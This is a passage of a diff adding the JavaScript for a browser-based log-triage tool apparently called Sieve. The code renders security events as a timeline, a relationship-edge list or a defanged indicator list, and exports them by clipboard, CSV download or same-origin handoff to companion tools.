+  for(const n of R.kept){let s=n[a],t=n[b];if(short){if(a==="parent"||a==="process")s=base(s);if(b==="process")t=base(t);}
+    if(!s||!t)continue;const k=s+"\u0000"+t;const e=map.get(k)||{source:s,target:t,relationship:rel,count:0,first_seen:n.timestamp,last_seen:n.timestamp};
+    e.count++;if(n.timestamp){if(!e.first_seen||n.timestamp<e.first_seen)e.first_seen=n.timestamp;if(n.timestamp>e.last_seen)e.last_seen=n.timestamp;}map.set(k,e);}
+  return [...map.values()];
+}
+function renderOut(){
+  let cols,rows,info;const oo=$("#outopts");
+  if(S.tab==="mill"){
+    cols=["timestamp","host","user","process","parent","src","dst","event","sources","dataset"];
+    rows=R.kept.map(n=>({...n,sources:n._srcs?[...n._srcs].filter(Boolean).join(" + "):srcOf(n),dataset:S.dataset}));info=`${rows.length} events, sorted by UTC time`;oo.innerHTML="";
+  }else if(S.tab==="spoke"){
+    cols=["source","target","relationship","count","first_seen","last_seen"];rows=edges();
+    info=`${rows.length} unique edges`;
+    oo.innerHTML=`<label class="lbl" for="edge">Edge</label><select id="edge">
+      <option value="parent>process">Parent → process</option><option value="user>process">User → process</option>
+      <option value="user>host">User → host</option><option value="src>dst">Source → destination</option></select>`;
+    $("#edge").value=S.edge;$("#edge").onchange=e=>{S.edge=e.target.value;renderOut();};
+    if(!rows.length)info="No edges. Map both ends of the edge in step 2.";
+  }else{
+    cols=["type","value","count","first_seen"];
+    const order=["url","domain","ipv4","sha256","sha1","md5"];
+    rows=R.iocs.slice().sort((x,y)=>order.indexOf(x.type)-order.indexOf(y.type)||y.count-x.count).map(e=>({...e,value:defang(e.type,e.value),_priv:e.type==="ipv4"&&isPriv(e.value)}));
+    info=`${rows.length} unique indicators`;
+    oo.innerHTML=`<label class="chk"><input type="checkbox" id="defang" ${S.defang?"checked":""}> Defang</label>`;
+    $("#defang").onchange=e=>{S.defang=e.target.checked;renderOut();};
+  }
+  $("#outinfo").textContent=info;
+  const sb=$("#sendout");sb.hidden=S.tab==="ioc";sb.innerHTML=S.tab==="spoke"?`<img class="ico" alt="" src="${ICON_SPOKE}">Send to Spoke`:`<img class="ico" alt="" src="${ICON_MILL}">Send to Mill`;
+  S.out=toCSV(cols,rows);$("#outtext").value=S.out;
+  const show=rows.slice(0,200);
+  $("#preview").innerHTML=`<thead><tr>${cols.map(c=>`<th>${c}</th>`).join("")}</tr></thead><tbody>${
+    show.map(r=>`<tr>${cols.map(c=>{let v=r[c]??"";let extra="";
+      if(c==="type")return `<td><span class="pill">${esc(v)}</span></td>`;
+      if(c==="value"&&r._priv)extra=' <span class="pill priv">private</span>';
+      return `<td title="${esc(v)}">${esc(v)}${extra}</td>`;}).join("")}</tr>`).join("")
+  }</tbody>`;
+  if(rows.length>200)$("#outinfo").textContent+=" · preview shows first 200";
+}
+function updateRecipe(){
+  $("#recipe").value=JSON.stringify({sieve:1,map:S.map,tzOffsetMinutes:+$("#tz").value,dedupe:$("#dedupe").checked,merge:$("#merge").checked,mergeWindowSec:+$("#mergewin").value,exclude:$("#exclude").value},null,2);
+}
+async function copy(text,ta){
+  try{await navigator.clipboard.writeText(text);toast("Copied to clipboard");}
+  catch(e){ta.hidden=false;ta.focus();ta.select();toast("Clipboard is blocked here. The text is selected below, so copy it with Ctrl+C or ⌘C.");}
+}
+const ICON_MILL="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='7' fill='%23141a24'/%3E%3Cpolygon points='28.0,16.0 24.7,18.9 26.4,22.0 22.1,22.9 22.0,26.4 17.8,25.0 16.0,28.0 13.1,24.7 10.0,26.4 9.1,22.1 5.6,22.0 7.0,17.8 4.0,16.0 7.3,13.1 5.6,10.0 9.9,9.1 10.0,5.6 14.2,7.0 16.0,4.0 18.9,7.3 22.0,5.6 22.9,9.9 26.4,10.0 25.0,14.2' fill='%23f2a93b'/%3E%3Ccircle cx='16' cy='16' r='3.2' fill='%23141a24'/%3E%3C/svg%3E";
+const ICON_SPOKE="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Cg stroke='%234e79a7' stroke-width='2.5' stroke-linecap='round'%3E%3Cpath d='M16 16L16 4M16 16L26.4 10M16 16L26.4 22M16 16L16 28M16 16L5.6 22M16 16L5.6 10'/%3E%3C/g%3E%3Cg fill='%234e79a7'%3E%3Ccircle cx='16' cy='16' r='5'/%3E%3Ccircle cx='16' cy='4' r='3'/%3E%3Ccircle cx='26.4' cy='10' r='3'/%3E%3Ccircle cx='26.4' cy='22' r='3'/%3E%3Ccircle cx='16' cy='28' r='3'/%3E%3Ccircle cx='5.6' cy='22' r='3'/%3E%3Ccircle cx='5.6' cy='10' r='3'/%3E%3C/g%3E%3C/svg%3E";
+const b64=u8=>{let s="";for(let i=0;i<u8.length;i+=0x8000)s+=String.fromCharCode.apply(null,u8.subarray(i,i+0x8000));return btoa(s);};
+const gz=async t=>new Uint8Array(await new Response(new Blob([t]).stream().pipeThrough(new CompressionStream("gzip"))).arrayBuffer());
+function stem(){return (S.dataset||"sieve").replace(/\.[^.]+$/,"").replace(/[^\w.-]+/g,"_")||"sieve";}
+function hasOut(){return S.out&&S.out.indexOf("\n")>0;}
+function download(){
+  if(!hasOut()){toast("Nothing to download yet. Load data and map the columns first.");return;}
+  const name=`${stem()}-${S.tab==="mill"?"timeline":S.tab==="spoke"?"edges":"iocs"}.csv`;
+  const a=document.createElement("a");a.href=URL.createObjectURL(new Blob([S.out],{type:"text/csv"}));a.download=name;
+  document.body.appendChild(a);a.click();setTimeout(()=>{URL.revokeObjectURL(a.href);a.remove();},1000);toast("Downloaded "+name);
+}
+// Mill: hand off through same-origin localStorage (Mill reads ?from=sieve, then clears it).
+// Spoke: use Spoke's own share-link format (#src=…&tgt=…&input=<gzip, base64url>), which it builds on load.
+async function send(){
+  if(!hasOut()){toast("Nothing to send yet. Load data and map the columns first.");return;}
+  const w=window.open("","_blank");
+  const go=url=>{if(w){w.opener=null;w.location.href=url;}else location.href=url;};
+  const fail=m=>{if(w)w.close();toast(m);};
+  try{
+    const data=await gz(S.out);
+    if(S.tab==="mill"){
+      try{localStorage.setItem("sieve.handoff",JSON.stringify({v:1,name:stem(),gz:b64(data),at:Date.now()}));}
+      catch(e){return fail("This timeline is too big to hand off directly. Use Download CSV and drop the file into Mill.");}
+      go("/mill/?from=sieve");
+    }else if(S.tab==="spoke"){
+      const enc=b64(data).replace(/\+/g,"-").replace(/\//g,"_").replace(/=+$/,"");
+      const h=`name=${encodeURIComponent(stem()+"-edges.csv")}&src=source&tgt=target&rel=relationship&time=first_seen&input=${enc}`;
+      if(h.length>2000000)return fail("This graph is too big for a link. Use Download CSV and open the file in Spoke.");
+      go("/spoke/#"+h);
+    }
+  }catch(e){fail("Couldn't prepare the data: "+e.message);}
+}
+let tt;function toast(m){$("#toast").textContent=m;clearTimeout(tt);tt=setTimeout(()=>$("#toast").textContent="",4000);}
+
+$("#sample").onchange=e=>load(SAMPLES[e.target.value],SAMPLE_NAMES[e.target.value]);
+$("#parse").onclick=()=>{S.dataset=S.dataset||"pasted";parse();};
+$("#raw").addEventListener("input",()=>{S.dataset="pasted";});
+["tz","dedupe","shortproc","merge","mergewin"].forEach(id=>$("#"+id).addEventListener("change",()=>{updateRecipe();run();}));
+$("#exclude").addEventListener("input",()=>{updateRecipe();run();});
+$("#tabs").addEventListener("click",e=>{const b=e.target.closest("button");if(!b)return;S.tab=b.dataset.t;
+  [...$("#tabs").children].forEach(x=>x.classList.toggle("on",x===b));renderOut();});
+$("#copyout").onclick=()=>copy(S.out,$("#outtext"));
+$("#dlout").onclick=download;
+$("#sendout").onclick=send;
+$("#copyrecipe").onclick=()=>copy($("#recipe").value,$("#recipe"));
+$("#applyrecipe").onclick=()=>{try{const r=JSON.parse($("#recipe").value);
+  if(r.map)for(const f of FIELDS){const v=r.map[f.k];S.map[f.k]=(Array.isArray(v)?v:v?[v]:[]).filter(h=>S.headers.includes(h)).slice(0,f.max||3);}
+  if(r.tzOffsetMinutes!=null)$("#tz").value=r.tzOffsetMinutes;if(r.dedupe!=null)$("#dedupe").checked=r.dedupe;if(r.merge!=null)$("#merge").checked=r.merge;if(r.mergeWindowSec!=null)$("#mergewin").value=r.mergeWindowSec;if(r.exclude!=null)$("#exclude").value=r.exclude;
+  S.autoKeys.clear();renderMap();run();toast("Recipe applied");}catch(e){toast("That recipe isn't valid JSON. Copy a recipe from Sieve and paste it whole.");}};
+const drop=$("#drop");
+function readFile(f){const rd=new FileReader();rd.onload=()=>load(rd.result,f.name);rd.readAsText(f);}
+$("#file").onchange=e=>{if(e.target.files[0])readFile(e.target.files[0]);};
+["dragenter","dragover"].forEach(t=>drop.addEventListener(t,e=>{e.preventDefault();drop.classList.add("over");}));
+["dragleave","drop"].forEach(t=>drop.addEventListener(t,e=>{e.preventDefault();drop.classList.remove("over");}));
+drop.addEventListener("drop",e=>{const f=e.dataTransfer.files[0];if(f)readFile(f);});
+window.addEventListener("dragover",e=>e.preventDefault());window.addEventListener("drop",e=>e.preventDefault());
+
+load(SAMPLES.sysmon,SAMPLE_NAMES.sysmon);
+</script>
+</body>
+</html>
